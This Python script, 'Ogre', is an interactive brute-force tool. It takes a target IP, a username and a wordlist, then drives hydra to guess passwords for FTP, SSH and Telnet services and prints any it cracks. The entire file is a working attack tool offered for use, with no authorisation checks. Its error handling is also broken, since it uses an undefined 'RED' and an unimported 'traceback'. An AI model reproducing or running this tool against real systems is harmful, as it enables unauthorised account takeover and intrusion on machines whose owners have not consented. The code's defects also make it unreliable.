#!/usr/bin/env python3
Blue, LBlue, Red, LRed, White, LWhite, Yellow, Magenta, Green, LGreen, Cyan, NC = '\033[1;94m', '\033[0;94m' ,'\033[1;91m', '\033[0;31m', '\033[1;97m', '\033[0;97m','\033[1;93m', '\033[1;35m', '\033[1;32m', '\033[0;32m', '\033[1;36m', '\033[0m'
import socket
import time
import concurrent.futures
import subprocess
import sys
import os

from subprocess import PIPE
def inputHandler():
    try:
        print()
        inputHeader= (str(input(Cyan + "[+] Enter your Choice: " + White)))
    except KeyboardInterrupt:
        print(Green + "\n" + "[~] Shutting down..." + NC)
        raise SystemExit
    except Exception as e:
        print(RED + "\n" + "[!] Ogre crashed..." + "\n" + "[!] Debug info: " + "\n")
        print(traceback.format_exc())
        print("\n" + NC)
        exit()
    if inputHeader == "1":
        ftp()
    elif inputHeader == "2":
        ssh()
    elif inputHeader == "3":
        telnet()
    else:
        print (Red + "[!] Wrong Choice: '" + Yellow + inputHeader + Red + "'")
        inputHandler()

def ftp():
    try:
        host = input(Cyan + "[+] Enter Host IP: " + White)
        username = input(Cyan + "[+] Enter Username to use: " + White)
        wordlist = input(Cyan + "[+] Enter path to Password wordlist(e.g. "+ Yellow + "'" + Cyan + "wordlist/sshpass.txt"+Yellow+"'" + Cyan + "): " + White)
        print("\n")
        ftpConnect(host, username, wordlist)
    except KeyboardInterrupt:
        print(Green + "\n" + "[~] Shutting down..." + NC)
        raise SystemExit
    except Exception as e:
        print(RED + "\n" + "[!] Ogre crashed..." + "\n" + "[!] Debug info: " + "\n")
        print(traceback.format_exc())
        print("\n" + NC)
        exit()
#    for i in wordlist.readlines():
#    	password = i.strip("\n")

def ssh():
    try:
        host = input(Cyan + "[+] Enter Host IP: " + White)
        username = input(Cyan + "[+] Enter Username to use: " + White)
        wordlist = input(Cyan + "[+] Enter path to Password wordlist(e.g. "+ Yellow + "'" + Cyan + "wordlist/sshpass.txt"+Yellow+"'" + Cyan + "): " + White)
        print("\n")
        sshConnect(host, username, wordlist)
    except KeyboardInterrupt:
        print(Green + "\n" + "[~] Shutting down..." + NC)
        raise SystemExit
    except Exception as e:
        print(RED + "\n" + "[!] Ogre crashed..." + "\n" + "[!] Debug info: " + "\n")
        print(traceback.format_exc())
        print("\n" + NC)
        exit()
        #with concurrent.futures.ThreadPoolExecutor() as executor:
        #    executor.submit(sshConnect, host, username, password)
def telnet():
    try:
        host = input(Cyan + "[+] Enter Host IP: " + White)
        username = input(Cyan + "[+] Enter Username to use: " + White)
        wordlist = input(Cyan + "[+] Enter path to Password wordlist(e.g. "+ Yellow + "'" + Cyan + "wordlist/sshpass.txt"+Yellow+"'" + Cyan + "): " + White)
        print("\n")
        telnetConnect(host, username, wordlist)
    except KeyboardInterrupt:
        print(Green + "\n" + "[~] Shutting down..." + NC)
        raise SystemExit
    except Exception as e:
        print(RED + "\n" + "[!] Ogre crashed..." + "\n" + "[!] Debug info: " + "\n")
        print(traceback.format_exc())
        print("\n" + NC)
        exit()
def sshConnect(host, username, wordlist):
    try:
        print(Green + "[+] Bruteforcing ssh... " + LWhite
              )
        p1 = subprocess.Popen(['hydra', '-l', username, '-P', wordlist, host,
                               'ssh', '-I', '-e', 'ns'], stdout=PIPE,
                              stderr=PIPE)
        for line in iter(p1.stdout.readline, b''):
            print(line.decode('utf-8').strip('\n'))
            sys.stdout.flush()
            time.sleep(0.0001)
            if 'host' in line.decode('utf-8'):
                print("\n" + LGreen + "[+] Cracked Password:" +
                      line.decode('utf-8') + LWhite)
    except Exception as exc:
        print("[!] Error : %s " % exc)

def ftpConnect(host, username, wordlist):
    try:
        print(Green + "[+] Bruteforcing FTP..." + LWhite)
        p1 = subprocess.Popen(['hydra', '-l', username, '-P', wordlist, host,
                                 'ftp', '-I', '-e', 'ns'], stdout=PIPE,
                                stderr=PIPE)
        for line in iter(p1.stdout.readline, b''):
            print(line.decode('utf-8').strip('\n'))
            sys.stdout.flush()
            time.sleep(0.0001)
            if 'host' in line.decode('utf-8'):
                print("\n" + LGreen + "[+] Cracked Password:" +
                line.decode('utf-8') + LWhite)
    except Exception as exc:
        print("[!] Error : %s " % exc)

def telnetConnect(host, username, wordlist):
    try:
        print(Green + "[+] BruteForcing Telnet..." + LWhite)
        p1 = subprocess.Popen(['hydra', '-l', username, '-P', wordlist, host,
                                   'telnet', '-I', '-e', 'ns'], stdout=PIPE,
                                  stderr=PIPE)
        for line in iter(p1.stdout.readline, b''):
            print(line.decode('utf-8').strip('\n'))
            sys.stdout.flush()
            time.sleep(0.0001)
            if 'host' in line.decode('utf-8'):
                print("\n" + LGreen + "[+] Cracked Password:" +
                line.decode('utf-8') + LWhite)
    except Exception as exc:
        print("[!] Error : %s " % exc)

os.system('clear||cls')
header = """

        ░█████╗░░██████╗░██████╗░███████╗
        ██╔══██╗██╔════╝░██╔══██╗██╔════╝
        ██║░░██║██║░░██╗░██████╔╝█████╗░░
        ██║░░██║██║░░╚██╗██╔══██╗██╔══╝░░ """+White+"""v0.1 by Yashvendra Kashyap a.k.a y_k_007"""+Green+"""
        ╚█████╔╝╚██████╔╝██║░░██║███████╗
        ░╚════╝░░╚═════╝░╚═╝░░╚═╝╚══════╝
  """
print(Green + "\t" + header + "\n\t" +Red+ "    The Ultimate Bruteforcer" +
     NC)
print()
print(Green + "[~] Select a Service to Brute: ")
print()
print(Yellow + "[1] FTP" + NC)
print(Yellow + "[2] SSH" + NC)
print(Yellow + "[3] Telnet" + NC)
inputHandler()

